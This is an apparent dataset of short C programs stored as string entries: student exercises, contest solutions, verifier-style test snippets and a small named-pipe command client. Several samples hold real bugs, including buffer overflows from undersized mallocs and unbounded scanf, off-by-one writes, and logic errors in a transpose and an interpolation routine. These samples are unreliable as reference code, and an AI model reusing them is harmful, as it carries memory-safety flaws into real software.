    "#include <stdio.h>\n#include <math.h>\nint main(){\n int len = 8;\n float a[8]={0,0,0,0,0,0,0,0};\n FILE *fp = fopen(\"data.txt\",\"r\");\n remove(\"envelope.txt\");\n FILE *out_fp = fopen(\"envelope.txt\",\"w\");\n float diff = 0, samp = 0, sum = 0, last_sum = 0, thresh = 0.75;\n int t_idx_1=0, t_idx_2=0, idx=0, count=0, detect = 0;\n while(count < 217070)\n {\n  fscanf(fp,\"%f\",&samp);\n  samp = fabs(pow(samp,3));\n  samp = 1;\n  sum -= a[idx];\n  sum += samp;\n  a[idx] = samp;\n  diff = sum - last_sum;\n  if (sum > thresh)\n  {\n   if (detect == 0 && t_idx_1 == 0)\n   {\n    t_idx_1 = count;\n   }\n   if (detect == 0 && t_idx_1 != 0 && t_idx_2 == 0)\n   {\n    t_idx_2 = count;\n   }\n   fprintf(out_fp,\"1\\n\");\n   detect = 1;\n  }\n  else\n  {\n   fprintf(out_fp,\"0\\n\");\n   detect = 0;\n  }\n  idx = (idx+1)%len;\n  count++;\n  last_sum = sum;\n }\n printf(\"%d , %d\\n\",t_idx_1,t_idx_2);\n fclose(fp);\n fclose(out_fp);\n}",
    "#include <stdio.h>\nint main(void){\n int a;\n double b;\n b = a = 1.5;\n printf(\"a = %d \\n\", a);\n printf(\"b = %f \\n\", b);\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n return 0;\n}",
    "int f() { return 1; }\nint main() {\n#pragma spf transform inline\n  {\n      if (1)\n        f();\n      return 1;\n  }\n}",
    "#include <stdio.h>\nint main()\n{\n  char string[99999] = \"The quick brown fox jumped over the pile of ice.\";\n  char *pos = string;\n  unsigned int words = 0;\n  while(*pos)\n  {\n        if(*pos == ' ' || *pos == '.')\n        {\n            words++;\n        }\n        printf(\"Procesing character %c with words %d.\\n\", *pos, words);\n        pos++;\n  }\n  printf(\"There were %d words. \\n\", words);\n  return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n\nint anagramma(char s[], char t[])\n{\n int lens, lent, i, j, res;\n char tmp;\n res = 0;\n lens = strlen(s);\n lent = strlen(t);\n if(lens==lent) {\n  for(i=0;i<lens;i++) {\n   for(j=0;j<lens-1;j++) {\n    if(s[j]>s[j+1]) {\n     tmp = s[j];\n     s[j] = s[j+1];\n     s[j+1] = tmp;\n    }\n    if(t[j]>t[j+1]) {\n     tmp = t[j];\n     t[j] = t[j+1];\n     t[j+1] = tmp;\n    }\n   }\n  }\n  if(strcmp(s,t)==0) {\n   res = 1;\n  }\n }\n return res;\n}\nint main(void)\n{\n char s1[30], s2[30];\n int ana;\n printf(\"Inserisci s1: \");\n scanf(\"%s\", s1);\n printf(\"Inserisci s2: \");\n scanf(\"%s\", s2);\n ana = anagramma(s1,s2);\n if(ana) {\n  printf(\"Le stringhe sono anagrammi!\\n\");\n }\n else {\n  printf(\"Le stringhe non sono anagrammi...\\n\");\n }\n return 0;\n}",
    "extern void __assert_fail();\nint main() {\n int x = 0;\n while (1) {\n  x += 1;\n  if (x == 2) {\n   x = 0;\n  }\n  if (x >= 2) {\n   __assert_fail();\n   return 1;\n  }\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint main()\n{\n    char words[81];\n    puts(\"Enter a string\");\n    sprintf(words, \"%s,%+10s%s\\n\", \"WWWW\", \"Hello\", \"jjj\");\n    puts(words);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <locale.h>\n#include <math.h>\nint minutos(int d)\n{\n    int distancia;\n    distancia = d * 2;\n    return (distancia);\n}\nint main()\n{\n    setlocale(6, \"pt-br\");\n    int m, distancia;\n    scanf(\"%d\", &m);\n    distancia = minutos(m);\n    printf(\"%d minutos\\n\", distancia);\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n\nlong long n;\nlong long fl = 0;\nsigned main() {\n    scanf(\"%lld\", &n);\n    long long manran = (long long)sqrt((double)n / 2.0);\n    for(long long i = 1; i <= manran; ++i) {\n        long long t = (long long)sqrt((double)n - (double)(i * i));\n        if (t < i) break;\n        if(t * t + i * i == n) printf(\"%lld %lld\\n\", i, t), fl = 1;\n    }\n    if(!fl) printf(\"No Solution\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nvoid guessNumber(int guess)\n{\n    if(guess == 555)\n    {\n        printf(\"Correct. You guessed it!\");\n    }\n    else if(guess > 555)\n    {\n        printf(\"Your guess is too high.\");\n    }\n    else\n    {\n  printf(\"Your guess is too low.\");\n    }\n}\nint main() {\nvoid guessNumber(int guess);\n    guessNumber(500);\n    guessNumber(600);\n    guessNumber(555);\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<math.h>\n#include<limits.h>\nint main(){\nint *a,*b,*c,i,j,k,n1,n2,n3;\nscanf(\"%d\",&n1);\na=(int*)malloc(n1*sizeof(int));\nfor(i=0;i<n1;i++)\nscanf(\"%d\",&a[i]);\nscanf(\"%d\",&n2);\nb=(int*)malloc(n2*sizeof(int));\nfor(i=0;i<n2;i++)\nscanf(\"%d\",&b[i]);\nn3=n1+n2;\nc=(int*)calloc(n3,sizeof(int));\ni=0;\nwhile(i<n3){\nwhile(i<n1){\nc[i]=a[i];\ni++;}\nc[i]=b[i-n1];\ni++;}\nfor(i=0;i<n3;i++)\n{\n for(j=i+1;j<n3;j++)\n {\n   if(c[i]==c[j]){\n     for(k=j;k<n3;k++){\n      c[k]=c[k+1];}\n    n3--;\n    j--; }\n              }\n}\nfor(i=0;i<n3;i++){\nfor(j=i+1;j<n3;j++){\nif(c[i]>c[j]){\nk=c[i];\nc[i]=c[j];\nc[j]=k;}}}\nfor(i=0;i<n3;i++)\nprintf(\"%d \",c[i]);\nreturn 0;\n}",
    "#include <stdio.h>\nint main(){\n    int var1 , var2 ;\n    scanf(\"%d%d\", &var1, &var2);\n    printf(\"%d\",var2 -var1);\n    return 0;\n}",
    "#include <stdio.h>\n\nint main()\n{\n\n    printf(\"hello macro..\\n\");\n\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n    double A, B;\n    scanf(\" %lf %lf\" , &A, &B);\n    printf(\"MEDIA = %0.5lf\\n\" , ((A*3.5)+(B*7.5))/11);\nreturn 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n\nint main () {\n  printf(\"3>2 => %d    3<2 => %d\\n\", 3 > 2, 3 < 2);\n  printf(\"!0 => %d    !3 => %d   !-23 => %d\\n\", !0, !3, !-23);\n  printf(\"3&&-5 => %d   -3&&0 => %d  3||-5 => %d    -3||0 => %d\\n\\n\", 3&&-5, -3&&0, 3||-5, -3||0);\n  int x=100;\n  if(x==14){\n     printf(\"In 'if(x==14)'.  x value: %d\\n\", x);\n  }\n  if(x=4){\n     printf(\"In 'if(x=4)'.  x value: %d\\n\", x);\n  }\n  if(x==-2){\n     printf(\"In 'if(x==-2)'. x value: %d\\n\", x);\n  }\n  if(x=-2){\n     printf(\"In 'if(x=-2)'. x value: %d\\n\", x);\n  }\n  if(x=0) {\n     printf(\"In 'if(x=0)'.  x value: %d\\n\", x);\n  }\n  printf(\"x value after: %d\\n\\n\", x);\n  int a=0;\n  while (a < 100){\n    printf(\"hello %d\\n\", a);\n    if (a==8)\n      break;\n    a++;\n  }\n  return 0;\n}",
    "#include<stdio.h>\nint main() {\n int arr[3][4] = {\n {11,22,33,44},\n {55,66,77,88},\n {11,66,77,44}\n };\n int i, j;\n for (i = 0; i < 3; i++) {\n  printf(\"Address of %d th array %u \\n\", i, *(arr + i));\n  for (j = 0; j < 4; j++) {\n   printf(\"arr[%d][%d]=%d (%u)\\n\", i, j, *(*(arr + i) + j), *(arr + i) + j);\n  }\n  printf(\"\\n\");\n }\n return 0;\n}",
    "#include<stdio.h>\n#include<string.h>\nint main(){\n char a[100000];\n int i,j,k,l,x=0,b=0;\n scanf(\"%s\",&a);\n l = strlen(a);\n for(i=0;i<l;i++){\n  if(a[i]=='-') x++;\n  else b++;\n }\n if(b==0) printf(\"YES\\n\");\n else if(x%b==0) printf(\"YES\\n\");\n else printf(\"NO\\n\");\n return 0;\n}",
    "#include <stdio.h>\nvoid reverseArr(int arr[], int size) {\n  int i, *p1, *p2, temp;\n  for (i = 0; i < size / 2; i++) {\n    p1 = &arr[i];\n    p2 = &arr[size - i - 1];\n    temp = *p1;\n    *p1 = *p2;\n    *p2 = temp;\n  }\n}\nvoid printArr(int arr[], int size) {\n  int *p;\n  for (p = arr; p < arr + size; p++) {\n    printf(\"%d, \", *p);\n  }\n}\nint main() {\n  int arr[] = {8, 3, 4, 6, 17, 27, 37, 49, 51};\n  int size = sizeof(arr) / sizeof(arr[0]);\n  reverseArr(arr, size);\n  printArr(arr, size);\n  return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\n\n\nvoid transposta(char matriz[3][5])\n{\n    matriz[5][3];\n    int i, j;\n    for(i=0; i<5; i++)\n    {\n        for(j=0; j<3; j++)\n        {\n            matriz[i][j] == matriz[j][i];\n        }\n    }\n    for(i=0; i<5; i++)\n    {\n        for(j=0; j<3; j++)\n        {\n            printf(\"%c \", matriz[j][i]);\n        }\n        puts(\"\");\n    }\n}\nint main()\n{\n    int i,j;\n    char matriz[3][5];\n    puts(\"Digite os caracteres da matriz:\");\n    for(i=0; i<3; i++)\n    {\n        for(j=0; j<5; j++)\n        {\n            printf(\"[%d][%d]: \",i,j);\n            scanf(\"%c\", &matriz[i][j]);\n            getchar();\n        }\n        puts(\"\");\n    }\n    transposta(matriz);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\nint main() {\n    char *s;\n    s = malloc(1024 * sizeof(char));\n    scanf(\"%[^\\n]\", s);\n    s = realloc(s, strlen(s) + 1);\n    for (int i = 0; i < strlen(s); i++){\n        if(s[i] == ' '){printf(\"\\n\");}\n        else{printf(\"%c\", s[i]);}\n    }\n    return 0;\n}",
    "#include <stdio.h>\ndouble integrator_state = 0.0;\ndouble derv = 0.0;\ndouble error_last1 = 0.0;\ndouble error_last2 = 0.0;\ndouble error_last3 = 0.0;\ndouble Comp1(double Input_dmd, double Input_sensed, double Kp_M, double Ki_M, double timestep)\n{\n    error_last1 = Input_dmd - Input_sensed;\n integrator_state = integrator_state + timestep*error_last1;\n    return error_last1*Kp_M + integrator_state*Ki_M;\n}\ndouble Comp2(double Input_dmd, double Input_sensed, double Kp_M, double Ki_M, double Kd_M, double timestep)\n{\n  double errorx = Input_dmd - Input_sensed;\n  integrator_state = integrator_state + timestep*errorx;\n  derv = errorx - error_last2;\n  error_last2 = errorx;\n  return error_last2*Kp_M + integrator_state*Ki_M + derv*Kd_M;\n}\nint main(int argc, char **argv)\n{\n  double t_final = 100.5;\n  double time_step = 0.015;\n  double Ki_M = 20.0;\n  double Kp_M = 75.0;\n  double Kd_M = 10.0;\n  int num_steps = t_final / time_step;\n  double desired_output = 10.0;\n  double plant_command;\n  double sensed_output = 5.0;\n  double plant_gain = 0.01;\n  sensed_output = 0.0;\n  for (int i = 0; i < num_steps; i++)\n    {\n      plant_command = Comp1(desired_output, sensed_output, Kp_M, Ki_M, time_step);\n   plant_command = Comp2(desired_output, sensed_output, Kp_M, Ki_M, Kd_M, time_step);\n    }\n  return 0;\n}",
    "#include <stdio.h>\n\nint sum2d(const int ar[][4], int rows);\nint sum(const int ar[], int n);\nint main(void)\n{\n    int total1, total2, total3 = 0;\n    int *pt1;\n    int (*pt2)[4];\n    pt1 = (int [2]){10,20};\n    pt2 = (int [2][4]){{1,2,3,-9},{4,5,6,-8}};\n    total1 = sum(pt1,2);\n    total2 = sum2d(pt2,2);\n    total3 = sum((int[]){4,4,4,5,5,5},6);\n    printf(\"Total1=%d\\n\", total1);\n    printf(\"Total2=%d\\n\", total2);\n    printf(\"Total3=%d\\n\", total3);\n    return 0;\n}\nint sum2d(const int ar[][4], int rows)\n{\n    int r, c, tot = 0;\n    for (r=0;r<rows;r++)\n    {\n for (c=0;c<4;c++)\n     tot+=ar[r][c];\n    }\n    return tot;\n}\nint sum(const int ar[], int n)\n{\n    int tot = 0; int i = 0;\n    for (i=0;i<n;i++)\n tot+=ar[i];\n    return tot;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdbool.h>\n\nint main() {\n FILE *inputSet;\n inputSet = fopen(\"input.txt\", \"r\");\n int i;\n int passVaild;\n int whitespace;\n _Bool byrB = 0;\n _Bool iyrB = 0;\n _Bool eyrB = 0;\n _Bool hgtB = 0;\n _Bool hclB = 0;\n _Bool eclB = 0;\n _Bool pidB = 0;\n char buffer[4096];\n passVaild = 0;\n memset(buffer, 0, sizeof(buffer));\n for (i = 0; i < (1069*8); i++){\n  fscanf(inputSet, \" %n%4095s\", &whitespace, buffer);\n  if (whitespace == 2){\n   if (byrB && iyrB && eyrB && hgtB && hclB && eclB && pidB){\n    printf(\"%s\\n\", buffer);\n    passVaild++;\n   }\n   byrB = 0;\n   iyrB = 0;\n   eyrB = 0;\n   hgtB = 0;\n   hclB = 0;\n   eclB = 0;\n   pidB = 0;\n  }\n  if (strstr (buffer,\"byr:\")){\n   byrB = 1;\n  }\n  if (strstr (buffer,\"iyr:\")){\n   iyrB = 1;\n  }\n  if (strstr (buffer,\"eyr:\")){\n   eyrB = 1;\n  }\n  if (strstr (buffer,\"hgt:\")){\n   hgtB = 1;\n  }\n  if (strstr (buffer,\"hcl:\")){\n   hclB = 1;\n  }\n  if (strstr (buffer,\"ecl:\")){\n   eclB = 1;\n  }\n  if (strstr (buffer,\"pid:\")){\n   pidB = 1;\n  }\n }\n if (strstr (buffer,\"byr:\")){\n  byrB = 1;\n }\n if (strstr (buffer,\"iyr:\")){\n  iyrB = 1;\n }\n if (strstr (buffer,\"eyr:\")){\n  eyrB = 1;\n }\n if (strstr (buffer,\"hgt:\")){\n  hgtB = 1;\n }\n if (strstr (buffer,\"hcl:\")){\n  hclB = 1;\n }\n if (strstr (buffer,\"ecl:\")){\n  eclB = 1;\n }\n if (strstr (buffer,\"pid:\")){\n  pidB = 1;\n }\n if (byrB && iyrB && eyrB && hgtB && hclB && eclB && pidB){\n  printf(\"%s\\n\", buffer);\n  passVaild++;\n }\n printf(\"%d\\n\", passVaild);\n printf(\"%s\\n\", buffer);\n fclose(inputSet);\n return 0;\n}",
    "#include <stdio.h>\nunsigned setbits(unsigned x, int p, int n, unsigned y)\n{\n    y = (y & ~(~0 << n)) << (p + 1 - n);\n    x = x & ~(~(~0 << n) << (p + 1 - n));\n    return x | y;\n}\nint main()\n{\n    unsigned x, y;\n    int p, n;\n    x = 0x0b;\n    y = 0x06;\n    p = 1;\n    n = 2;\n    printf(\"setbits(0x%x, %d, %d, 0x%x) = 0x%x\\n\",\n           x, p, n, y,\n           setbits(x, p, n, y));\n    return 0;\n}",
    "#include<stdlib.h>\n#include<stdio.h>\n#include<string.h>\nint dfa = 0;\nvoid q0(char c){\n    if(c == 'a')\n        dfa = 1;\n    else if(c == 'b')\n        dfa = 0;\n    else\n        dfa = -1;\n}\nvoid q1(char c){\n    if(c == 'a')\n        dfa = 1;\n    else if(c == 'b')\n        dfa = 2;\n    else\n        dfa = -1;\n}\nvoid q2(char c){\n    if(c == 'a')\n        dfa = 3;\n    else if(c == 'b')\n        dfa = 0;\n    else\n        dfa = -1;\n}\nvoid q3(char c){\n    if(c == 'a')\n        dfa = 1;\n    else if(c == 'b')\n        dfa = 2;\n    else\n        dfa = -1;\n}\nint isAccepted(char str[]){\n    int i, len = strlen(str);\n    for (i = 0; i < len; i++){\n        if (dfa == 0)\n            q0(str[i]);\n        else if (dfa == 1)\n            q1(str[i]);\n        else if (dfa == 2)\n            q2(str[i]);\n        else if (dfa == 3)\n            q3(str[i]);\n        else\n            return 0;\n    }\n    if(dfa == 3)\n        return 1;\n    else\n        return 0;\n}\nint main(){\n    char *str;\n    int size, option;\n    printf(\"Automata To Accept Strings Ending With aba\\n\\n\");\n    while(1){\n        printf(\"1. Check New String\\n2. Exit\\n\");\n        printf(\"Enter Option\\n\");\n        scanf(\"%d\", &option);\n        switch(option){\n            case 1:{\n                printf(\"\\nEnter Size of String:\\n\");\n                scanf(\"%d\", &size);\n                str = (char*)malloc(sizeof(char));\n                printf(\"Enter String:\\n\");\n                scanf(\"%s\", str);\n                if(isAccepted(str))\n                    printf(\"ACCEPTED\\n\");\n                else\n                    printf(\"NOT ACCEPTED\\n\");\n                free(str);\n                break;\n            }\n            case 2:{\n                exit(0);\n            }\n            default:{}\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\nint main()\n{\n    int a, b;\n    scanf(\"%d\\n%d\", &a, &b);\n    for(a;a<=b;a++)\n    {\n        if(a<=9)\n        {\n            if(a==1)\n            {\n                printf(\"one\\n\");\n            }else if(a==2)\n            {\n                printf(\"two\\n\");\n            }else if(a==3)\n            {\n                printf(\"three\\n\");\n            }else if(a==4)\n            {\n                printf(\"four\\n\");\n            }else if(a==5)\n            {\n                printf(\"five\\n\");\n            }else if(a==6)\n            {\n                printf(\"six\\n\");\n            }else if(a==7)\n            {\n                printf(\"seven\\n\");\n            }else if(a==8)\n            {\n                printf(\"eight\\n\");\n            }else if(a==9)\n            {\n                printf(\"nine\\n\");\n            }\n        }else{\n            if(a%2!=0)\n            {\n                printf(\"odd\\n\");\n            }else{\n                printf(\"even\\n\");\n            }\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\nint main() {\n    char *str;\n    str = (char *) malloc(1000 * sizeof(char));\n    scanf(\"%s\", str);\n    int *res_arr;\n    res_arr = (int *) calloc(10, sizeof(int));\n    for(int i = 0; i < strlen(str); i++){\n        switch (str[i]) {\n            case '0':\n                res_arr[0]++;\n                break;\n            case '1':\n                res_arr[1]++;\n                break;\n            case '2':\n                res_arr[2]++;\n                break;\n            case '3':\n                res_arr[3]++;\n                break;\n            case '4':\n                res_arr[4]++;\n                break;\n            case '5':\n                res_arr[5]++;\n                break;\n            case '6':\n                res_arr[6]++;\n                break;\n            case '7':\n                res_arr[7]++;\n                break;\n            case '8':\n                res_arr[8]++;\n                break;\n            case '9':\n                res_arr[9]++;\n                break;\n        }\n    }\n    for(int i = 0; i < 10; i++){\n        printf(\"%d \", res_arr[i]);\n    }\n    free(res_arr);\n    free(str);\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n  int k = 1;\n  int a;\n  a = k++;\n  printf(\"%d %d\\n\", a, k);\n  a = ++k;\n  printf(\"%d %d\\n\", a, k);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc,char **argv)\n{\n int a = 0;\n int b = 0;\n int c = 0;\n char d = '\\0';\n printf (\"Enter some values: \\n\");\n scanf(\"%d%d%d %c\",&a,&b,&c,&d);\n printf(\"a = %d\\nb = %d\\nc = %d\\nd = %c\\n\",a,b,c,d);\n return 0;\n}",
    "extern double pow(double, double);\nextern void abort (void);\nvolatile double x = 1.0;\nint main(int argc, char **argv)\n{\n  double d1 = x;\n  double d2 = pow(d1, 1.0 / 3.0);\n  double d3 = d1 * d1;\n  if (d3 != 1.0 || d2 != 0.0)\n    abort ();\n  return 0;\n}",
    "#include <stdio.h>\n#include <limits.h>\nvoid t1a(void)\n{\n    int a = -0x5000;\n    printf(a < 0x5000 ? \"ok\\n\" : \"error\\n\");\n}\nvoid t1b(void)\n{\n    int a = -0x5000;\n    if(a<0x5000)\n    {\n        printf(\"ok\\n\");\n    }\n    else\n    {\n        printf(\"error\\n\");\n    }\n}\nint main(void)\n{\n    t1a();t1b();\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main() {\n    int i, j, n;\n    float x[20], y[20], u, p, p1, sum;\n    printf(\"Type the number of points: \");\n    scanf(\"%d\", &n);\n    printf(\"Type the u whose value will be calculated: \");\n    scanf(\"%f\", &u);\n    for (i=0; i<n; i++) {\n        printf(\"x[%d]: \", i);\n        scanf(\"%f\", &x[i]);\n        printf(\"y[%d]: \", i);\n        scanf(\"%f\", &y[i]);\n    }\n    p = 1;\n    for (i=0; i<n; i++) {\n        p *= (u - x[i]);\n    }\n    sum = 0;\n    for (i=0; i<n; i++) {\n        p1 = y[i] / (u - x[i]);\n        for (j=0; j<n; j++) {\n            if (i != j)\n                p1 /= (x[i] - x[j]);\n        }\n    }\n    sum += p1;\n    p *= sum;\n    for (i=0; i<n; i++)\n        printf(\"%8.4f\\t %8.4f\\n\", x[i], y[i]);\n    printf(\"THe required value at u=%f is %8.4f\\n\", u, p);\n    return 0;\n}",
    "#include <string.h>\n#include <stdio.h>\n#include <stdlib.h>\n\nint **initW(int n) {\n    int **w = malloc(sizeof(int *) * n);\n    int i;\n    for (i = 0; i != n; i++) {\n        int *p = malloc(sizeof(int) * n);\n        int j;\n        p[0] = i;\n        for (j = 1; j != n; j++) {\n            p[j] = (-1);\n        }\n        w[i] = p;\n    }\n    return w;\n}\nvoid showW(int **w, int n) {\n    int i, j;\n    for (i = 0; i != n; i++) {\n        printf(\"%2d:\", i);\n        int start = 1;\n        for (j = 0; j != n; j++) {\n            if (w[i][j] == (-1)) {\n                break;\n            }\n            if (start) {\n                printf(\" \");\n                start = 0;\n            }\n            printf(\" %d\", w[i][j]);\n        }\n        printf(\"\\n\");\n    }\n}\nvoid deinitW(int **w, int n) {\n    for (int i = 0; i != n; i++) {\n        free(w[i]);\n    }\n    free(w);\n}\nvoid moveOnto(int **w, int n, int a, int b) {\n}\nvoid moveOver(int **w, int n, int a, int b) {\n}\nvoid pileOnto(int **w, int n, int a, int b) {\n}\nvoid pileOver(int **w, int n, int a, int b) {\n}\n\nint main() {\n    int n;\n    int r = scanf(\"%d\", &n);\n    if (r != 1) {\n        return -1;\n    }\n    int **w = initW(n);\n    showW(w, n);\n    char cmd[32], dec[32];\n    int a, b;\n    while ((r = scanf(\"%s%d%s%d\", cmd, &a, dec, &b)) != 0) {\n        if (strcmp(cmd, \"quit\") == 0) {\n            break;\n        }\n        if (a == b) {\n            continue;\n        }\n        printf(\"%s %d %s %d\\n\", cmd, a, dec, b);\n    }\n    printf(\"%s\\n\", cmd);\n    deinitW(w, n);\n    return 0;\n}",
    "#include<stdio.h>\nint s[100005];\nint main()\n{\n int n,i,j=0,k,t;\n scanf(\"%d\",&n);\n for(i=0;i<n;i++)\n {\n  scanf(\"%d\",&t);\n  s[t]=s[t]+1;\n }\n scanf(\"%d\",&k);\n for(i=100000;j!=k;i--)\n {\n  if(s[i]!=0) j++;\n }\n printf(\"%d %d\",i+1,s[i+1]);\n return 0;\n}",
    "int main(){\n int x = 4;\n int y = 8;\n}",
    "#include <fcntl.h>\n#include <stdio.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <unistd.h>\n#include <string.h>\n#include <stdlib.h>\n\n\nstatic const char *OUT_PIPE = \"/tmp/lurk_commands\";\nint\nopen_for_reading(const char *name)\n{\n  return open(name, (0x04000000) | ((__wasi_fdflags_t)(1 << 2)), 0);\n}\nint\nopen_for_writing(const char *name)\n{\n  int fd = open(name, (0x10000000));\n  if (fd < 0) {\n    perror(\"open\");\n    exit(1);\n  }\n  return fd;\n}\nint\nread_response(int in_pipe, char *response)\n{\n  char buf[1024];\n  memset(buf, '\\0', 1024);\n  int read_success, attempts = 0;\n  while (attempts++ < 20) {\n    printf(\"attemtps: %d\\n\", attempts);\n    read_success = read(in_pipe, buf, 1024);\n    if (read_success != -1) {\n      strncat(response, buf, strlen(buf));\n      return 1;\n    }\n  }\n  return 0;\n}\nint\nsend_command(int out_pipe, char *command)\n{\n  return write(out_pipe, command, strlen(command));\n}\nint main(int argc, char *argv[])\n{\n  char response[1024];\n  memset(response, '\\0', 1024);\n  int in_pipe, out_pipe, received = 0;\n  in_pipe = open_for_reading(\"/tmp/lurk_data\");\n  out_pipe = open_for_writing(OUT_PIPE);\n  send_command(out_pipe, argv[1]);\n  if (!read_response(in_pipe, response)) {\n    strncat(response, \"not received\", 12);\n  }\n  printf(\"command: %s\\n\", argv[1]);\n  printf(\"response: %s\\n\", response);\n  close(in_pipe);\n  close(out_pipe);\n  return 0;\n}",
    "#include <stdio.h>\n\nint main()\n{\n  int n, i, j, T, now, need;\n  char s[1000 +5];\n  scanf(\"%d\",&T);\n  for(i=0;i<T;i++) {\n    now = need = 0;\n    scanf(\"%d%s\",&n, s);\n    now = s[0]-'0';\n    for(j=1;j<=n;j++){\n      if( now < j ){\n need += j-now;\n now = j;\n      }\n      now += s[j]-'0';\n    }\n    printf(\"Case #%d: %d\\n\", i+1, need);\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n  int arr[100],n,i,pos=-1,element,flag=0;\n  printf(\"Enter the number of elements you wish to enter: \\n\");\n  scanf(\"%d\",&n);\n  printf(\"Enter the elements which should be in sorted order \\n\");\n  for(i=0;i<n;i++){\n    scanf(\"%d\",&arr[i]);\n  }\n  printf(\"Enter the element to be searched in the array: \\n\");\n  scanf(\"%d\",&element);\n  for(i=0;i<n;i++){\n    if(arr[i]==element){\n      pos=i+1;\n      flag=1;\n      break;\n    }\n    if(element<arr[i]){\n      break;\n    }\n  }\n  if(flag==1){\n    printf(\"The elemnent has been found at position %d\", pos);\n  }\n  else{\n    printf(\"The elemnent has not been found\");\n  }\nreturn 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <ctype.h>\n#include <stdlib.h>\n#include <time.h>\n#include <stdbool.h>\n\nchar* nahodne_slovo(int n) {\n    char *slovo = (char *) malloc(sizeof(char) * (n*2 + 1));\n    char samohlasky[] = {'a', 'e', 'i', 'y', 'o', 'u'};\n    char spoluhlasky[] = {'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'z'};\n    _Bool keep_going = 1;\n    int number;\n    for (int i = 0; i < n*2; i += 2) {\n        number = (rand() % (20));\n        slovo[i] = spoluhlasky[number];\n        if (i+1 < n*2) {\n            number = (rand() % (6));\n            slovo[i+1] = samohlasky[number];\n        }\n        else {\n            break;\n        }\n    }\n    slovo[n*2+1] = '\\0';\n    return slovo;\n}\nint main(int argc, char** argv) {\n    srand((unsigned)time(((void*)0)));\n    char *slovo = nahodne_slovo(5);\n    puts(slovo);\n    free(slovo);\n    return (0);\n}",
    "#include <stdio.h>\nint main () {\n    int l = 0, c = 0, escolha = 0;\n    int A[2][2], B[3][3];\n    int detA = 0, detB = 0, detBpos = 0, detBneg = 0;\n    printf(\"\\nDeterminante de uma matriz\");\n    printf(\"\\nvoce quer calcular o determinante de uma matriz 2x2 ou 3x3 ?\");\n    printf(\"\\n[2] - 2x2 [3] 3x3\\n\");\n    scanf(\"%d\", &escolha);\n    switch (escolha) {\n        case 2:\n            for (l = 0; l < 2; l++) {\n                for (c = 0; c < 2; c++) {\n                    printf(\"Digite o elemento A%d%d\\n\", l + 1, c + 1);\n                    scanf(\"%d\", &A[l][c]);\n                    }\n                }\n            printf(\"\\n\");\n            for (l = 0; l < 2; l++) {\n                for (c = 0; c < 2; c++) {\n                    printf(\"%d \", A[l][c]);\n                    if (c == 1) {\n                        printf(\"\\n\");\n                    }\n                }\n            }\n            detA = (A[0][0] * A[1][1]) - (A[0][1] * A[1][0]) ;\n            printf(\"\\nDeterminante 2x2 = %d\\n\", detA);\n            break;\n        case 3:\n            for (l = 0; l < 3; l++) {\n                for (c = 0; c < 3; c++) {\n                    printf(\"Digite o elemento B%d%d\\n\", l + 1, c + 1);\n                    scanf(\"%d\", &B[l][c]);\n                }\n            }\n            printf(\"\\n\");\n            for (l = 0; l < 3; l++) {\n                for (c = 0; c < 3; c++) {\n                    printf(\"%d \", B[l][c]);\n                    if (c == 2) {\n                        printf(\"\\n\");\n                    }\n                }\n            }\n            detBpos = (B[0][0] * B[1][1] * B[2][2]) + (B[0][1] * B[1][2] * B[2][0]) + (B[0][2] * B[2][1] * B[1][0]);\n            detBneg = (B[0][2] * B[1][1] * B[2][0]) + (B[0][1] * B[1][0] * B[2][2]) + (B[0][0] * B[2][1] * B[1][2]);\n            detB = detBpos - detBneg;\n            printf(\"\\nDeterminante 3x3 = %d\\n\\n\", detB);\n            break;\n        default:\n            printf(\"WTF\");\n            break;\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint Factor(int n)\n{\n    if (n <= 1)\n    {\n        return 1;\n    }\n    return n * Factor(n - 1);\n}\nint main()\n{\n    int n;\n    printf(\"Please enter the factorial number to be calculated.\\n\");\n    scanf(\"%d\", &n);\n    printf(\"%d \\n\", Factor(n));\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <limits.h>\nint last_state[3][10000];\nint\nmax(int d, int c)\n{\n return d>c?d:c;\n}\nint maxProfit(int* prices, int pricesSize) {\n int i;\n last_state[0][0] = 0;\n last_state[1][0] = -prices[0];\n last_state[2][0] = (-2147483647 -1);\n for(i = 1; i < pricesSize; i++) {\n  last_state[0][i] = max(last_state[0][i-1],last_state[2][i-1]);\n  last_state[1][i] = max(last_state[1][i-1], last_state[0][i-1]-prices[i]);\n  last_state[2][i] = last_state[1][i-1]+prices[i];\n  printf(\"%d %d %d\\n\", last_state[0][i], last_state[1][i], last_state[2][i]);\n }\n return max(last_state[0][i-1], last_state[2][i-1]);\n}\nint main()\n{\n int a[] = {1,2,3,0,2};\n int s = 5;\n printf(\"%d\\n\", maxProfit(a, s));\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    printf(\"Hello World\");\n    return 0;\n}",
